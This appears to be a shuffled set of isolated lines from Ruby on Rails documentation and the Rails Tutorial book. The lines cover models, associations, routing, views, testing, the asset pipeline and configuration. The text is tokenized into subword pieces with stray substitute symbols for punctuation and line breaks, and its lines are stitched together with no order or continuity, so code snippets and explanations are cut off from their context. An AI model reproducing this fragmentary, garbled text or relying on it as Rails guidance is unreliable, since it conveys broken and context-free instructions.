▁id ▁in t ( 11 ) ▁ NOT ▁NULL ▁ auto _ increment ,
▁The ▁current ▁object ▁and ▁object _ counter ▁variables ▁will ▁be ▁available ▁in ▁the ▁layout ▁as ▁well , ▁the ▁same ▁way ▁they ▁do ▁within ▁the ▁partial .
▁Use ▁two ▁spaces ▁to ▁ indent ▁ ch un k s ▁of ▁code - - that ▁is , ▁for ▁markup ▁purposes , ▁two ▁spaces ▁with ▁re spec t ▁to ▁the ▁left ▁m ar g in ▖
▁ assoc ▖ has _ many ▁: ex p en s es
▁* ▁` collection ▖ delete ( object , ▁ ▖▖▖)
▁# ▁< import ed - from - svn ▁type =" boolean "> false </ import ed - from - svn >
▁The ▁practical ly ▁blank ▁default ▁User ▁test .
▁Tests ▁ still ▁pass ?
▁ cat ▁< file >
▁S ince ▁we ▁will ▁be ▁using ▁email ▁addresses ▁as ▁user name s , ▁this ▁sort ▁of ▁\ k ode { find } ▁will ▁be ▁useful ▁when ▁we ▁learn ▁how ▁to ▁let ▁users ▁log ▁in ▁to ▁our ▁site ▁( Chapter ~\ ref { cha : sign _ up }) .
▁That ' s ▁not ▁very ▁useful ▁though , ▁so ▁let ' s ▁add ▁the ▁` show ` ▁action ╼ before ▁proceeding .
▁* ▁En able s ▁the ▁Active ▁Record ▁query ▁cache .
▁You ▁can ▁run ▁ EXPLAIN ▁on ▁the ▁queries ▁trigger ed ▁by ▁relation s ▖
▁( To ▁write ▁more ▁ th or ough ▁test ▁suite s ▁for ▁Ajax - h ea v y ▁applications , ▁take ▁a ▁look ▁at ▁\ href { http :// s elenium h q ▖ org /}{ S elenium } ▁and ▁\ href { http :// w at ir ▖ com /}{ W at ir } ▖)
▁If ▁the ▁above ▁ sequence ▁seem s ▁ im p la us ible , ▁believe ▁me , ▁it ▁isn ' t : ▁it ▁can ▁happen ▁on ▁any ▁Rails ▁website ▁with ▁significant ▁traffic .
▁If ▁the ▁name ▁of ▁the ▁other ▁model ▁cannot ▁be ▁d er ive d ▁from ▁the ▁association ▁name , ▁you ▁can ▁use ▁the ▁`: class _ name ` ▁option ▁to ▁supply ▁the ▁model ▁name ▖
▁$ ▁bin / rails ▁g ▁model
▁def ▁c amp a ig n _ message ( business , ▁user )
▁ //= ▁require ▁ jquery
▁redirect _ to ▁photos _ url
▁S ub s equ ent ▁push es ▁can ▁omit ▁the ▁other ▁arguments ▁and ▁write ▁simply
▁If ▁you ▁need ▁a ▁ deep ▁copy ▁of ▁an ▁object , ▁you ▁should ▁use ▁` deep _ dup ` ▖
▁ Adding ▁a ▁micropost ▁with ▁a ▁different ▁ owner .
▁redirect _ to ▁@ article
▁I
▁The ▁page ▁show n ▁in ▁Figure ~\ ref { fig : user _ profile _ microposts _ no _ st y l ing } ▁has ▁no ▁micropost - specific ▁styling , ▁so ▁let ' s ▁add ▁some ▁( Listing ~\ ref { code : micropost _ css }) ▁and ▁take ▁a ▁look ▁at ▁the ▁result ing ▁pages
▁m attr _ accessor ▁: warning s _ on _ first _ load
▁╼╼ ▁\ section { Mo t i v ation } ▁% ▁( fold )╼ ▁\ label { sec : motivation }╼╼
▁F ing er print ing ▁is ▁enabled ▁by ▁default ▁for ▁production ▁and ▁ disabled ▁for ▁all ▁other ╼ environments ▖
▁With ▁the ▁class ▁method ▁` File ▖ atomic _ write ` ▁you ▁can ▁write ▁to ▁a ▁file ▁in ▁a ▁way ▁that ▁will ▁prevent ▁any ▁reader ▁from ▁see ing ▁h al f - written ▁content .
▁This ▁is ▁not ▁typical !
▁To ▁make ▁these ▁collection s , ▁it ' s ▁worth ▁know ing ▁about ▁the ▁useful ▁\ k ode { \ % w [ ]} ▁technique ▁for ▁making ▁arrays ▁of ▁strings , ▁as ▁seen ▁in ▁this ▁console ▁session :
▁This ▁link ▁will ▁allow ▁you ▁to ▁br ing ▁up ▁the ▁form ▁that ▁let s ▁you ▁create ▁a ▁new ▁article .
▁Use d ▁in ▁Rails ▁for ▁when ▁the ▁` scaffold ` ▁generator ▁is ▁run , ▁but ▁this ▁ hook ▁can ▁be ▁used ▁in ▁other ▁generates ▁as ▁well ▖
▁<%= ▁@ re view ▖ title ▁%> ▁<% # ▁fine , ▁escape d ▁if ▁needed ▁%>
▁class ▁Co un try ▁< ▁ActiveRecord :: Base
▁In ▁other ▁words ,
▁See ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ be t a 4/ classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁They ▁would ╼ be ▁' mass ▁as signed ' ▁into ▁your ▁model ▁and ▁then ▁into ▁the ▁database ▁along ▁with ▁the ╼ g ood ▁ stuff ▁- ▁ potentially ▁break ing ▁your ▁application ▁or ▁ w or se .
▁Having ▁edit ed ▁the ▁login ▁form , ▁we ' re ▁now ▁ready ▁to ▁remember ▁users ▁if ▁they ▁check ▁the ▁checkbox ▁and ▁ forget ▁them ▁otherwise .
▁It ▁returns ▁the ▁date ▁with ▁the ▁same ▁day ▁in ▁the ▁previous ▁or ▁next ▁ quarter :
▁E ve ry ▁partial ▁also ▁has ▁a ▁local ▁variable ▁with ▁the ▁same ▁name ▁as ▁the ▁partial ▁( m in us ▁the ▁ underscore )▖
▁" K ur t ▁G ö d el "▖ parameterize ▁# ▁=> ▁" k ur t - g ode l "
▁You ' ll ▁see ▁a ▁bit ▁more ▁complex ity ▁here ▁than ▁you ▁did ▁in ▁the ▁controller ▁for ╼ articles ▖
▁* ▁` config ▖ i 18 n ▖ en force _ available _ locales ` ▁ensure s ▁that ▁all ▁ locales ▁passed ▁through ▁i 18 n ▁must ▁be ▁declare d ▁in ▁the ▁` available _ locales ` ▁list , ▁ ra is ing ▁an ▁` I 18 n :: In valid Local e ` ▁exception ▁when ▁setting ▁an ▁un available ▁ locale ▖
▁t ▖ integer ▁: customer _ id
▁ Edit ing ▁the ▁profile ▁images ▁is ▁already ▁functional ▁since ▁we ' ve ▁out source d ▁image ▁upload ▁to ▁the ▁Gravatar ▁website ; ▁we ▁can ▁edit ▁Gravatar s ▁by ▁click ing ▁on ▁the ▁`` change '' ▁link ▁from ▁Figure ~\ ref { fig : edit _ page }, ▁as ▁show n ▁in ▁Figure ~\ ref { fig : gravatar _ c r o p p er } .
▁The ▁new ▁steps ▁appear ▁in ▁Listing ~\ ref { code : user _ signout _ test } .
▁Add ▁the ▁following ▁lines ▁to ▁your ▁application ▁configuration :
▁Sometimes ▁it ' s ▁quick , ▁some times ▁it ' s ▁ s low ▖
▁The ▁` params ` ▁method ▁is ▁the ▁object ▁which ╼ re present s ▁the ▁parameters ▁( or ▁fields ) ▁ com ing ▁in ▁from ▁the ▁form ▖
▁ Location : ▁ / photos /1
▁You ▁can ▁also ▁specify ▁an ▁array ▁of ▁paths ▁for ▁` template _ path `, ▁and ▁they ╼ will ▁be ▁search ed ▁in ▁order .
▁d ▖ next _ year ▁# ▁=> ▁We d , ▁28 ▁Feb ▁200 1
▁( client s ▖ first _ name ▁= ▁' Ryan ' ▁ AND ▁orders ▖ status ▁= ▁' receive d ')
▁The ▁method ▁` all _ day ` ▁returns ▁a ▁ range ▁represent ing ▁the ▁whole ▁day ▁of ▁the ▁current ▁time .
▁# ▁< rank ▁type =" integer "> 53 </ rank >
▁This ▁process ▁is ▁repeated ▁un til ▁all ▁of ▁the ▁records ▁have ▁been ▁processed :
▁Then ▁we ' ll ▁comment ▁out ▁the ▁validation , ▁write ▁a ▁failing ▁test , ▁and ▁verify ▁that ▁un comment ing ▁the ▁validation ▁get s ▁the ▁test ▁to ▁pass .
▁Active ▁Job ▁provides ▁a ▁way ▁to ▁catch ▁exception s ▁raised ▁during ▁the ▁execut ion ▁of ▁the ╼ job :
▁Noti ce ▁how ▁we ▁switch ▁subject s ▁using ▁the ▁\ k ode { subject } ▁method , ▁replacing ▁\ k ode {@ user } ▁with ▁\ k ode { other \_ user }, ▁allow ing ▁us ▁to ▁test ▁the ▁ follower ▁relationship ▁in ▁a ▁natural ▁way :
▁as ▁seen ▁in ▁Listing ~\ ref { code : micropost _ factory } .
▁More over , ▁ recent ▁addition s ▁to ▁Rails ▁( Section ~\ ref { sec : adding _ a _ secure _ password }) ▁make ▁it ▁easy ▁to ▁write ▁a ▁custom ▁authentication ▁system .
▁xml ▖ cha n n el ▁do
▁By ╼ default , ▁it ▁will ▁match ▁an ▁optional ▁sign ▁followed ▁by ▁an ▁in te gr al ▁or ▁ float ing ╼ point ▁number ▖
▁ 1234567890▖50 6 ▖ to _ s (: currency , ▁ precision : ▁3 ) ▁# ▁=> ▁$ 1, 2 34 , 5 67 , 89 0▖5 06
▁This ▁is ▁the ▁first ▁application ▁for ▁the
▁ ╼ ▁ .
▁Configur e ▁this ▁via ▁` config ▖ action _ dispatch ▖ x _ send file _ header ` ▁option .
▁in ▁Listing ~\ ref { code : sessions _ resource } .
▁Listing ~\ ref { code : sidebar _ css } ▁includes ▁the ▁\ k ode { ▖ gravatar \_ edit } ▁class , ▁which ▁we ' ll ▁put ▁to ▁work ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users } .
▁Code ▁for ▁the ▁login ▁form .
▁class ▁ Proc ess V ide o J ob ▁< ▁ ActiveJob :: Base
▁This ▁step ▁is ▁optional , ▁but ▁being ▁a ▁GitHub ▁ member ▁will ▁open ▁the ▁do or ▁to ▁part ic ip ating ▁in ▁a ▁ wide ▁variety ▁of ▁open - source ▁ projects .
▁### ▁Re t ri e v ing ▁M ultiple ▁Object s ▁in ▁B at ch es
▁On ▁the ▁cloud ▁IDE , ▁we ▁can ▁do ▁this ▁as ▁follows
▁* ▁` uniq `
▁To ▁pass ▁the ▁object ▁to ▁the ▁partial , ▁we ▁use ▁a ▁hash ▁with ▁value ▁equal ▁to ▁the ▁object ▁and ▁key ▁equal ▁to ▁the ▁desired ▁name ▁of ▁the ▁variable ▁in ▁the ▁partial , ▁which ▁is ▁what ▁the ▁second ▁line ▁in ▁Listing ~\ ref { code : micropost _ form } ▁accomplish es .
▁#### # ▁Co un term ea sure s
▁The ▁user ▁profile ▁page ▁\ href { http :// localhost :3000/ users /1}{/ users /1 } ▁with ▁the ▁default ▁Gravatar ▖ ~\ href { http :// railstutorial ▖ org / images / figures / profile _ with _ gravatar _ bootstrap _4_0 - full ▖ png }{( full ▁size )}
▁method
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁Ruby ▁on ▁Rails ▁has ▁two ▁main ▁set s ▁of ▁documentation : ▁the ▁ guides , ▁which ▁help ▁you ╼ learn ▁about ▁Ruby ▁on ▁Rails , ▁and ▁the ▁API , ▁which ▁serve s ▁as ▁a ▁reference .
▁now ▁+ ▁1▖ year
▁For ▁example , ▁` Client ▖ find _ by _ first _ name _ and _ locked (" Ryan ", ▁true ) ` .
▁would ▁work ▁as ▁well .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / in tr o spec tion ▖ rb ` .
▁| ▁GET ▁| ▁ / photos ▁| ▁photos # index ▁| ▁display ▁a ▁list ▁of ▁all ▁photos ▁|
▁duplicate ▁# ▁=> ▁[ ' foo ', ▁' another - string ']
▁ private
▁### ▁` remove `
▁When ▁you ▁create ▁a ▁fresh ▁object , ▁for ╼ example ▁using ▁the ▁` new ` ▁method , ▁that ▁object ▁does ▁not ▁be long ▁to ▁the ▁database ╼ y e t ▖
▁However ▁there ▁are ▁a ▁few ▁cases ▁where ▁` atomic _ write ` ▁cannot ▁change ▁the ▁file ▁ owner ship ▁or ▁ permission s , ▁this ▁error ▁is ▁c a ug h t ▁and ▁skip ped ▁over ▁ tr us ting ▁in ▁the ▁user / file system ▁to ▁ensure ▁the ▁file ▁is ▁ accessible ▁to ▁the ▁process es ▁that ▁need ▁it .
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : following _ p _ follow _ bang } .
▁# ▁Return s ▁true ▁if ▁no ▁errors ▁are ▁found , ▁false ▁otherwise .
▁A ▁light er - we ight ▁and ▁more ▁flexible ▁approach ▁to ▁testing
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁we ▁implemented ▁user ▁signup ▁by ▁making ▁an ▁HTML ▁form ▁that ▁issue d ▁an ▁HTTP ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { create } ▁action ▁in ▁the ▁Users ▁controller .
▁ SELECT ▁count ( D IS T IN C T ▁clients ▖ id ) ▁AS ▁count _ all ▁FROM ▁clients
▁If ▁using ▁the ▁ turbolinks ▁gem , ▁which ▁is ▁included ▁by ▁default ▁in ▁Rails ▁4 , ▁then ╼ include ▁the ▁' data - turbolinks - track ' ▁option ▁which ▁cause s ▁ turbolinks ▁to ▁check ▁if ╼ an ▁asset ▁has ▁been ▁updated ▁and ▁if ▁so ▁load s ▁it ▁into ▁the ▁page :
▁include ▁M
▁Note ▁that ▁the ▁\ k ode { destroy } ▁method ▁in ▁Listing ~\ ref { code : microposts _ destroy _ action } ▁redirect s ▁to ▁the ▁URL
▁* ▁How ▁to ▁contribute ▁to ▁the ▁Ruby ▁on ▁Rails ▁documentation .
▁S ince ▁we ▁changed ▁the ▁` author _ class ` ▁method ▁to ▁return ▁a ▁` Class ` ▁instead ▁of ▁a ╼` String `, ▁we ▁must ▁also ▁modify ▁our ▁` belongs _ to ` ▁definition ▁in ▁the ▁` Blorgh :: Article `
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : new _ password _ reset } ▁and ▁Figure ~\ ref { fig : forgot _ password _ form } .
▁### ▁M er g ing
▁&& ▁ expiration _ date ▁< ▁Date ▖ today
▁create ▁app / views / microposts / show ▖ html ▖ erb
▁Similar ▁to ▁the ▁model ▁name spacing , ▁a ▁controller ▁called ▁` Article sController ` ▁becomes ╼` Blorgh :: Article sController ` ▁and ▁the ▁views ▁for ▁that ▁controller ▁will ▁not ▁be ▁at ╼` app / views / articles `, ▁but ▁` app / views / blorgh / articles ` ▁instead ▖
▁### ▁` many ?
▁On ▁the ▁other ▁hand , ▁many ▁beginning ▁Rails ▁developers ▁are ▁ ex ci ted ▁about ▁making ▁\ emph { web } ▁applications , ▁and ▁would ▁rather ▁not ▁ s log ▁through ▁a ▁50 0 - page ▁book ▁on ▁p ure ▁Ruby ▁before ▁ever ▁writing ▁a ▁single ▁web ▁page .
▁### ▁De let ing ▁Article s
▁ counter _ cache : ▁true
▁( Compar e ▁to ▁the ▁email ▁uniqueness ▁index ▁from ▁Listing ~\ ref { code : email _ uniqueness _ index } ▁and ▁the ▁multiple - key ▁index ▁in ▁Listing ~\ ref { code : micropost _ migration } ▖)
▁ Most ▁pull ▁requests ▁will ▁go ▁through ▁a ▁few ▁it er ation s ▁before ▁they ▁get ▁merge d ▖╼
▁Now ▁we ' ll ▁create ▁a ▁second ▁user ▁by ▁re visit ing ▁the ▁\ href { http ://0▖0▖0▖0:3000/ users / new }{\ text tt { new } } ▁page ▁and ▁ submitting ▁a ▁second ▁set ▁of ▁user ▁information ; ▁the ▁result ing ▁user ▁\ href { http ://0▖0▖0▖0:3000/ users }{\ text tt { index } } ▁is ▁show n ▁in ▁Figure ~\ ref { fig : demo _ user _ index _ two _ rails _3} .
▁You ▁will ▁need ▁to ▁use :
▁The ▁` link _ to ` ▁method ▁is ▁one ▁of ▁Rails ' ▁built - in ▁view ▁helpers ▖
▁The ▁` collection ▖ delete ` ▁method ▁remove s ▁one ▁or ▁more ▁objects ▁from ▁the ▁collection ▁by ▁setting ▁their ▁foreign ▁keys ▁to ▁` NULL ` .
▁This ▁will ▁automatically ▁link ▁the ▁comment ▁so ▁that ▁it ▁belongs ▁to ╼ that ▁particular ▁article .
▁# ▁equivalent ▁to ▁Time ▖ current ▖ advance ( months : ▁1)
▁params ▖ require (: article )▖ permit (: title , ▁: text , ▁: author _ name )
▁With in ▁the ▁` app / assets ` ▁directory , ▁there ▁are ▁the ▁` images `, ▁` javascripts ` ▁and ╼` stylesheets ` ▁directories ▁which , ▁again , ▁you ▁should ▁be ▁ familiar ▁with ▁due ▁to ▁their ╼ s im i l ar ity ▁to ▁an ▁application ▖
▁` root ▁' welcome # index ' ` ▁tell s ▁Rails ▁to ▁map ▁requests ▁to ▁the ▁root ▁of ▁the ╼ application ▁to ▁the ▁ welcome ▁controller ' s ▁index ▁action ▁and ▁` get ▁' welcome / index ' `╼ te ll s ▁Rails ▁to ▁map ▁requests ▁to ▁< http :// localhost :3000/ welcome / index > ▁to ▁the ╼ welcome ▁controller ' s ▁index ▁action ▖
▁### ▁` to _ s `
▁beginning _ of _ day ▁( midnight , ▁at _ midnight , ▁at _ beginning _ of _ day )
▁( Compar e ▁to ▁Table ~\ ref { table : demo _ RESTful _ users } ▖)
▁* ▁` config ▖ active _ record ▖ default _ time zone ` ▁determine s ▁whether ▁to ▁use ▁` Time ▖ local ` ▁( if ▁set ▁to ▁`: local ` ) ▁or ▁` Time ▖ utc ` ▁( if ▁set ▁to ▁`: utc ` ) ▁when ▁pull ing ▁date s ▁and ▁time s ▁from ▁the ▁database ▖
▁If ▁you ▁d ec ide ▁to ▁use ▁S ublime ▁Text , ▁you ▁m ight ▁want ▁to ▁follow ▁the ▁optional ▁setup ▁instructions ▁for ▁\ href { https :// github ▖ com / mhartl / rails _ tutorial _ s ublime _ text } { Rails ▁Tutorial ▁S ublime ▁Text }
▁The ▁` collection ▖ exists ?` ▁method ▁check s ▁whether ▁an ▁object ▁me e ting ▁the ▁supplied ▁ ╼ condition s ▁exists ▁in ▁the ▁collection ▖
▁A ▁mockup ▁of ▁the ▁ proto - feed ▁with ▁micropost ▁delete ▁links .
▁En able s ▁the ▁use ▁of ▁time ▁ calculations ▁and ▁declaration s , ▁like ▁` 45 ▖ minute s ▁+ ▁2▖ hour s ▁+ ▁4 ▖ years ` .
▁To ▁get ▁the ▁failing ▁test ▁to ▁pass , ▁instead ▁of ▁\ k ode { flash } ▁we ▁use ▁\ k ode { flash ▖ now }, ▁which ▁is ▁specifically ▁design ed ▁for ▁display ing ▁flash ▁messages ▁on ▁rendered ▁pages ; ▁unlike ▁the ▁contents ▁of ▁\ k ode { flash }, ▁its ▁contents ▁disappear ▁as ▁soon ▁as ▁there ▁is ▁an ▁ additional ▁request .
▁in ▁Listing ~\ ref { code : delete _ link _ tests } .
▁Rails ' ▁ sanitize () ▁method ▁does ▁a ▁good ▁job ▁to ▁f end ▁off ▁encoding ▁attacks .
▁t ▖ references ▁: manager
▁The ▁` select ` ▁method ▁let s ▁you ▁override ▁the ▁SQL ▁` SELECT ` ▁clause ▁that ▁is ▁used ▁to ▁retrieve ▁data ▁about ▁the ▁ associated ▁objects ▖
▁* ▁Rails ▁4▖0 ▁has ▁ deprecated ▁the ▁old - style ▁hash ▁base d ▁find er ▁API ▖ ▁This ▁means ▁that ╼ ▁methods ▁which ▁previous ly ▁accepted ▁" find er ▁options " ▁no ▁longer ▁do ▖
▁In ▁this ▁chapter ▁we ' ll ▁learn ▁how .
▁in ▁Listing ~\ ref { code : stylesheets _ partial } .
▁The ▁last ▁example ▁uses ▁the ▁useful ▁\ k ode { inspect } ▁method , ▁which ▁returns ▁a ▁string ▁with ▁a ▁literal ▁representation ▁of ▁the ▁object ▁it ' s ▁called ▁on :
▁This ▁is ▁because ▁Rails ▁automatically ▁infer s ▁the ▁class ▁name ▁from ▁the ▁association ▁name ▖
▁An ▁emphasi s ▁on ▁HTTP ▁verb s ▁is ▁typical ▁of ▁web ▁framework s ▁( including ▁Rails ) ▁i nfluence d ▁by ▁the ▁\ emph { REST ▁architecture }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ demo _ app } ▁and ▁will ▁start ▁learning ▁about ▁more ▁in ▁Chapter ~\ ref { cha : sign _ up } .
▁% w ( a ▁b ▁c ▁d )▖ prepend (' e ') ▁# ▁=> ▁% w ( e ▁a ▁b ▁c ▁d )
▁We ▁simply ▁issue ▁the ▁correct ▁request ▁to ▁each ▁action ▁and ▁confirm ▁that ▁the ▁micropost ▁count ▁is ▁un change d ▁and ▁the ▁result ▁is ▁ redirected ▁to ▁the ▁login ▁URL , ▁as ▁seen ▁in ▁Listing ~\ ref { code : create _ destroy _ micropost _ tests } .
▁( The ▁code ▁in ▁Listing ~\ ref { code : db _ seed } ▁is ▁a ▁bit ▁advanced , ▁so ▁don ' t ▁worry ▁too ▁much ▁about ▁the ▁details ▖)
▁A ▁ summary ▁of ▁the ▁data ▁model ▁for ▁users ▁appears ▁in ▁Figure ~\ ref { fig : demo _ user _ model } .
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁add ▁two ▁ additional ▁refinement s : ▁an ▁account ▁activation ▁link ▁for ▁new ly ▁registered ▁users ▁( ve ri fy ing ▁a ▁valid ▁email ▁address ▁in ▁the ▁process ) ▁and ▁password ▁resets ▁to ▁help ▁users ▁who ▁ forget ▁their ▁passwords .
▁Then , ▁upon ▁ reload ing ▁the ▁user ▁show ▁page , ▁the ▁flash ▁message ▁disappear s ▁as ▁pro mis ed ▁( Figure ~\ ref { fig : signup _ flash _ reload ed }) .
▁No ▁ signing ▁in
▁By ▁default ▁ track s ▁everything ▁on ▁ autoload ▁paths ▁and ▁is ▁set ▁to ▁true ▖
▁" hello "▖ at ( 4 ) ▁# ▁=> ▁" o "
▁block ▖ call
▁The ▁next ▁line ▁can ▁be ▁a ▁bit ▁confusing ▁but ▁is ▁fai r ly ▁common ▁in ▁ idiomatic ▁Rails ▁programming :
▁Inde ed , ▁the ▁technique ▁is ▁exactly ▁the ▁same ▁as ▁for ▁user ▁following , ▁with ▁the ▁role s ▁of ▁\ k ode { follower \_ id } ▁and ▁\ k ode { followed \_ id } ▁ reverse d .
▁You ▁should ▁use ▁` app / assets ` ▁for ╼ file s ▁that ▁must ▁under g o ▁some ▁pre - process ing ▁before ▁they ▁are ▁served .
▁We ▁start ▁by ▁ generating ▁a ▁test ▁as ▁usual :
▁The ▁Home ▁page ▁after ▁ deleting ▁the ▁second - most - recent ▁micropost .
▁In ▁particular , ▁the ▁asset ▁pipeline ▁combine s ▁all ▁the ▁application ▁stylesheets ▁into ▁one ▁CSS ▁file ▁(\ k ode { application ▖ css }), ▁combine s ▁all ▁the ▁application ▁JavaScript ▁into ▁one ▁JavaScript ▁file ▁(\ k ode { application ▖ js }), ▁and ▁then ▁\ emph { mini f ies } ▁them ▁to ▁remove ▁the ▁unnecessary ▁ spacing ▁and ▁indentation ▁that ▁ blo at s ▁file ▁size .
▁First - time ▁system ▁setup
▁To ▁do ▁that , ▁you ' ll ▁modify ╼` app / views / articles / new ▖ html ▖ erb ` ▁to ▁check ▁for ▁error ▁messages :
▁S up po s ing ▁we ▁use ▁the ▁same ▁` _ box ` ▁partial ▁from ▁above , ▁this ▁would ▁produce ▁the ▁same ▁output ▁as ▁the ▁previous ▁example .
▁* ▁` _ form ▖ html ▖ erb `
▁If ▁you ▁ still ▁find ▁this ▁tutorial ▁too ▁difficult , ▁you ▁m ight ▁try ▁starting ▁with ▁\ href { http :// learn - rails ▖ com /}{ \ emph { Learn ▁Ruby ▁on ▁Rails } } ▁by ▁D an i el ▁Ke h o e ▁or ▁\ href { http :// mb sy ▖ co / 7 Z d c 7 } { O ne ▁Mon th ▁Rails }, ▁both ▁of ▁which ▁are ▁ ge ar ed ▁more ▁toward ▁complete ▁beginners ▁than ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / indent ▖ rb ` .
▁Generat ing ▁a ▁StaticPages ▁controller .
▁As ▁you ▁m ight ▁guess , ▁such ▁files ▁allow ▁us ▁to ▁mix ▁JavaScript ▁and ▁ embedded ▁Ruby ▁to ▁perform ▁actions ▁on ▁the ▁current ▁page .
▁Because ▁we ▁won ' t ▁need ▁fixtures ▁un til ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁for ▁now ▁we ' ll ▁just ▁remove ▁them , ▁leav ing ▁an ▁empty ▁fixtures ▁file ▁( Listing ~\ ref { code : empty _ fixtures }) .
▁Rails ▁allows ▁us ▁to ▁define ▁custom ▁routing ▁rules , ▁there by ▁providing ▁named ▁routes .
▁The ▁Home ▁page ▁with ▁status ▁feed ▁and ▁ increment ed ▁following ▁count .
▁Set ▁it ▁to ▁' 0 ; ' ▁if ▁you ▁want ▁to ▁switch ▁XSS ▁A udi to r ▁off ( use ful ▁if ▁response ▁contents ▁ script s ▁from ▁request ▁parameters )
▁get ▁' search ', ▁on : ▁: collection
▁ Hello , ▁Rails !
▁require ▁' active _ support / all '
▁The ▁purpose ▁of ▁a ▁feed ▁is ▁to ▁pull ▁out ▁the ▁microposts ▁who se ▁user ▁id s ▁correspond ▁to ▁the ▁users ▁being ▁followed ▁by ▁the ▁current ▁user ▁( and ▁the ▁current ▁user ▁itself ), ▁as ▁indicate d ▁by ▁the ▁ ar row s ▁in ▁the ▁diagram .
▁### ▁` errors [ ]`
▁get ▁' photos /* other ', ▁to : ▁' photos # unknown '
▁One ▁technique ▁for ▁maintain ing ▁the ▁user ▁signin ▁status ▁is ▁to ▁use ▁a ▁ tr ad it ion al ▁Rails ▁session ▁( via ▁the ▁special ▁\ k ode { session } ▁function ) ▁to ▁store ▁a ▁\ emph { remember ▁token } ▁equal ▁to ▁the ▁user ' s ▁id :
▁By ▁default , ▁the ▁console ▁start s ▁in ▁a ▁\ emph { development ▁environment }, ▁which ▁is ▁one ▁of ▁three ▁separate ▁ environments ▁defined ▁by ▁Rails ▁( the ▁other s ▁are ▁\ emph { test } ▁and ▁\ emph { production }) .
▁This ▁change ▁does ▁require ▁that ▁the ▁engine ▁is ▁run ▁from ▁a ▁Rails ▁application ▁that ╼ has ▁an ▁` Application Controller ` .
▁* ▁Mailer ▁ Fi lt ers ▁a b or t ▁further ▁process ing ▁if ▁ body ▁is ▁set ▁to ▁a ▁non - nil ▁value .
▁This ▁particular ▁\ k ode { initialize } ▁take s ▁one ▁argument , ▁\ k ode { attributes } :
▁P re tt y ▁ s we e t ▖)
▁ Cl ic k ▁`` Create ''
▁=> ▁[ 2, ▁3 , ▁4 , ▁5 , ▁6 , ▁7 , ▁ 8, ▁ 9 ]
▁All ▁that ▁is ▁needed ▁to ▁complete ▁the ▁authentication ▁functionality ▁is ▁to ▁restrict ▁access ▁to ▁pages ▁base d ▁on ▁login ▁status ▁and ▁user ▁id entity .
▁# ▁No ▁last _ name = ▁instance ▁ writer ▁is ▁generated .
▁First , ▁we ▁try ▁to ▁save ▁the ▁user ; ▁if ▁the ▁save ▁succeed s , ▁the ▁user ' s ▁information ▁get s ▁written ▁to ▁the ▁database ▁automatically , ▁and ▁we ▁then ▁\ emph { redirect } ▁the ▁browser ▁to ▁show ▁the ▁user ' s ▁profile ▁( to get her ▁with ▁a ▁ friendly ▁ greeting ), ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : signup _ success _ mockup } .
▁Here ▁we ▁check ▁that ▁the ▁followed ▁user ▁count ▁go es ▁down ▁by ~ 1 ▁and ▁include ▁the ▁relationship ▁and ▁followed ▁user ' s ▁id :
▁my _ hash ▁= ▁ { ' first ' ▁=> ▁1, ▁' second ' ▁=> ▁' two ', ▁' th ir d ' ▁=> ▁[1, 2, 3 ]}
▁An y th ing ▁that ▁can ▁be ▁ ch o p ped ▁up ╼ in to ▁small ▁ unit s ▁of ▁work ▁and ▁run ▁in ▁parallel , ▁really .
▁U nfortunately , ▁ RVM ▁and ▁ rb env ▁can ' t ▁be ▁used ▁on ▁the ▁same ▁system ▁simul t an e ous ly , ▁and ▁since ▁I ' ve ▁been ▁using ▁ RVM ▁longer ▁that ' s ▁the ▁one ▁I ▁use ▁in ▁this ▁tutorial .
▁This ▁means ▁adding ▁a ▁second ▁user ▁to ▁our ▁users ▁fixture ▁file , ▁as ▁show n ▁in ▁Listing ~\ ref { code : fixture _ second _ user } .
▁ Order ing
▁N a v ig ate ▁to ▁the ▁Rails ▁[ GitHub ▁repository ]( https :// github ▖ com / rails / rails ) ▁and ▁ press ▁" For k " ▁in ▁the ▁upper ▁right ▁hand ▁c or n er .
▁That ▁is , ▁` Date ▖ new ( 1582 , ▁10 , ▁4 )▖ tomorrow ` ▁returns ▁` Date ▖ new ( 1582 , ▁10 , ▁ 15 ) ` ▁and ▁so ▁on ▖
▁created _ at : ▁"2013-03-11 ▁00:57:46" , ▁updated _ at : ▁"2013-03-11 ▁00:57:46" > ,
▁# ▁=> ▁Mon , ▁29 ▁Mar ▁2010 ▁00:00:00 ▁+0000
▁Note ▁that ▁we ▁write ▁the ▁commit ▁message ▁in ▁the ▁\ emph { present } ▁t en se ▁( and , ▁technical ly ▁ speak ing , ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / I mp er a tive _ m ood } { im pe ra tive ▁m ood }) .
▁See ▁[ # 16 5 2 6 ]( https :// github ▖ com / rails / rails / pull / 16 5 2 6 ) ▁for ▁more ▁details .
▁App end ing ▁paths ▁to ▁this ▁configuration ▁option ▁will ▁cause ▁those ▁paths ▁to ▁be ▁used ▁in ▁the ▁search ▁for ▁assets .
▁A nother ▁common ▁use ▁is ▁in ▁a ▁function ' s ▁return ▁value :
▁route ▁resources ▁: users
▁You ▁can ▁also ▁specify ▁a ▁second ▁partial ▁to ▁be ▁rendered ▁between ▁instance s ▁of ▁the ▁main ▁partial ▁by ▁using ▁the ▁`: space r _ template ` ▁option :
▁\ k ode { lib / assets } : ▁assets ▁for ▁libraries ▁written ▁by ▁your ▁ dev ▁team
▁client ▁= ▁Client ▖ take
